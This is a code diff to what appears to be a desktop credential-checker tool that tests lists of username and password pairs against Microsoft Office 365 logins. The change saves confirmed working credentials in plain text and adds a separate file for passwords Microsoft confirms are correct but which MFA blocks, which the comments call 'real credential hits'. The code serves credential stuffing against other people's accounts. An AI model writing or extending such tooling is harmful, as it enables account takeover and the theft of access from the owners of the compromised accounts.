@@ -560,9 +560,14 @@ ipcMain.handle('office365:check', async (_e, { targets, opts }) => {
         signal: office365Abort.signal,
       },
       (result, index) => {
-        if (result?.status === 'valid') {
-          try { appendOffice365Valid(result); } catch (err) { recordCrash('office365LiveSave', err); }
-        }
+        try {
+          // A clean token -> office365-valid.txt. A password Microsoft CONFIRMS is
+          // correct but gates behind MFA (passwordValid, status 'unknown') is a
+          // real credential hit -> office365-mfa-valid.txt, kept separate so the
+          // user can see it isn't lost in the "unknown" pile.
+          if (result?.status === 'valid') appendOffice365Valid(result);
+          else if (result?.passwordValid) appendOffice365MfaValid(result);
+        } catch (err) { recordCrash('office365LiveSave', err); }
         sendToWindow('office365:progress', { result, index, total: list.length });
       },
     );
@@ -1089,14 +1094,23 @@ function validLoginsPath() {
 function office365ValidPath() {
   return join(resultFolderPath(), 'office365-valid.txt');
 }
+// Passwords Microsoft confirmed correct but which are gated behind MFA — real
+// credential hits, kept out of the main valid file so their status is clear.
+function office365MfaValidPath() {
+  return join(resultFolderPath(), 'office365-mfa-valid.txt');
+}
 function resetOffice365ValidFile() {
   const p = office365ValidPath();
   mkdirSync(dirname(p), { recursive: true });
   writeFileSync(p, '');
+  writeFileSync(office365MfaValidPath(), '');
   return p;
 }
 function appendOffice365Valid(result) {
   appendFileSync(office365ValidPath(), `https://outlook.office.com: ${result.user}:${result.pass}\n`);
+}
+function appendOffice365MfaValid(result) {
+  appendFileSync(office365MfaValidPath(), `https://outlook.office.com: ${result.user}:${result.pass}  # ${result.detail || 'MFA required'}\n`);
 }
 
 /**
